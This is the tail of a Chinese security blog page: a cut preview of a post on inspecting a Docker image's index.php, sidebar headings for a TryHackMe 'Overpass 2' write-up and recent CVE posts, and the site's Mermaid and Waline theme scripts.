不知道端口的情况下运行该镜像docker run -it &lt;images&gt; /bin/bash  查看运行端口，发现就是80，那就可以用以下命令运行docker 123docker run -d -p 4545:80 &lt;images&gt; # 进入容器docker exec -it &lt;container&gt; /bin/bash  ‍ 在容器中找到index.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687&lt;?php@error_reporting(E_ALL);if...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/symya/MyPic/2025/test.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">symv1a</div><div class="author-info-description">随便写写，随缘更新</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/symya"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/symya" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:symv1a@163.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">今日事，今日毕</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#THM-Offensive-Pentesting-Section2-Overpass-2-Hacked"><span class="toc-number">1.</span> <span class="toc-text">THM - Offensive Pentesting - Section2 - Overpass 2 - Hacked</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%96%E4%BB%AC%E7%94%A8%E6%9D%A5%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%90%91-shell-%E7%9A%84%E9%A1%B5%E9%9D%A2-URL-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">他们用来上传反向 shell 的页面 URL 是什么？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A0%94%E7%A9%B6%E2%80%94%E2%80%94%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">研究——分析代码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hashcat"><span class="toc-number">3.1.</span> <span class="toc-text">hashcat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#john"><span class="toc-number">3.2.</span> <span class="toc-text">john</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Attack-Get-back-in"><span class="toc-number">4.</span> <span class="toc-text">Attack - Get back in!</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/cve202551482-letta-ai-component-code-injection-leads-to-rce-zxwmhs.html" title="CVE-2025-51482 Letta AI 组件代码注入导致RCE">CVE-2025-51482 Letta AI 组件代码注入导致RCE</a><time datetime="2026-01-07T10:40:09.000Z" title="Created 2026-01-07 10:40:09">2026-01-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/cve20253248-z2i1g0l.html" title="CVE-2025-3248">CVE-2025-3248</a><time datetime="2026-01-05T09:56:35.000Z" title="Created 2026-01-05 09:56:35">2026-01-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/basic-use-of-suricata-23gslt.html" title="suricata基本使用">suricata基本使用</a><time datetime="2025-12-26T16:37:21.000Z" title="Created 2025-12-26 16:37:21">2025-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/mac-ida-pro9.2-mcp-traepei-zhi-jiao-cheng-1r5x1m.html" title="MAC+IDA Pro9.2+MCP+Trae配置教程">MAC+IDA Pro9.2+MCP+Trae配置教程</a><time datetime="2025-12-24T09:44:55.000Z" title="Created 2025-12-24 09:44:55">2025-12-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/2025rctf-wp-1ljcfy.html" title="2025RCTF wp">2025RCTF wp</a><time datetime="2025-11-20T15:51:03.000Z" title="Created 2025-11-20 15:51:03">2025-11-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://cdn.jsdelivr.net/gh/symya/MyPic/2025/wallhaven-z8egpo.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2025 - 2026 By symv1a</span></div><div class="footer_custom_text">Hi, welcome to my <a href="https://symya.github.io/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Toggle Between Traditional and Simplified Chinese">繁</button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (true) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
+  const option = null
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: '',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline } 
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !false) {
+    if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
